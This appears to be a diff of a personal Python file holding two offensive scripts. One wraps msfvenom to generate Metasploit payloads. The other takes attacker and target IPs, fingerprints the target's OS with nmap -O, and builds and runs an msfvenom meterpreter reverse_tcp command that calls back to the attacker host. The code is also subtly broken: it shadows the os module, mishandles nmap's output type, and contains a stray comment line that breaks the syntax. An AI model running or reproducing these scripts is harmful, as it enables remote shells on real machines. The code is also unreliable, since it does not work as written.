@@ -1,4 +1,4 @@
-
+I DONT THINK THIS IS THE RIGHT ONE 
 def msfvenomWrapper():
     # Get payload type
     payload_type = input("Please specify payload type (e.g. windows/meterpreter/bind_tcp): ")
@@ -22,3 +22,34 @@ def msfvenomWrapper():
     print(generated_payload)
 
 msfvenomWrapper()
+
+------------------------------------------------------------------------------------------------------------------------------------------------------------------
+IF I CAN GET THIS ONE TO WORK, THIS MIGHT BE A GOOD ONE
+#!/usr/bin/python
+
+import os
+import subprocess
+
+print("Welcome to the Reverse Shell Payload Generator")
+
+# Get info from user
+attackerIP = input("Please enter the IP of the attacker machine: ")
+attackerPort = input("Please enter the port of the attacker machine: ")
+
+# Enumerate target
+targetIP = input("Please enter the IP of the target machine: ")
+osInfo = subprocess.check_output(["nmap", "-O", targetIP])
+
+# Parse OS info 
+if "Linux" in osInfo:
+    os = "linux"
+elif "Windows" in osInfo:
+    os = "windows"
+elif "Solaris" in osInfo:
+    os = "solaris"
+
+# Generate payload
+payload = "msfvenom -p "+os+"/meterpreter/reverse_tcp LHOST="+attackerIP+" LPORT="+attackerPort+" EXITFUNC=thread -f raw"
+
+# Execute msfvenom
+os.system(payload)
